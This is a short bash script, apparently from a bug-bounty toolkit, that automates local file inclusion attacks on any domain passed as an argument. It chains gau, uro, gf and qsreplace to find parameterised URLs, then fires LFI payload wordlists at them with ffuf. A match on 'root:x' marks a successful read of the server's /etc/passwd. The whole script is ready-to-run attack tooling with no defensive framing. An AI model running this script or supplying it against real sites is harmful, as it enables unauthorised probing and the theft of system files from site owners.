#!/bin/bash

#	LFi:
#	Log file: active.LFi.log

	if [ $# -lt 1 ]; then
		echo "Usage: active.LFi target.com"
	else
	
		export HOST=$1
#		OPTION: -w $HOME/WORKZONE/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
#		OPTION:	ffuf -u $url -w $HOME/WORKLISTS/Payloads/LFI.1 -H "Host: FUZZ" -mc 200 | anew active.LFi.log; done

		gau $HOST | uro | gf lfi | qsreplace "FUZZ" | while read url ; do ffuf -u $url -w $HOME/WORKZONE/payloads/LFI.3 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -c -t 20 -rate 11 -p 2 -r -mc 200 -ac -sa -mr "root:x" -or -od LFI.OUTPUT -of json -o LFI.ffuf.json ; done
	fi
	
#	--------------------------------------------------------------------------------------------------------------
#	--------------------------------------------------------------------------------------------------------------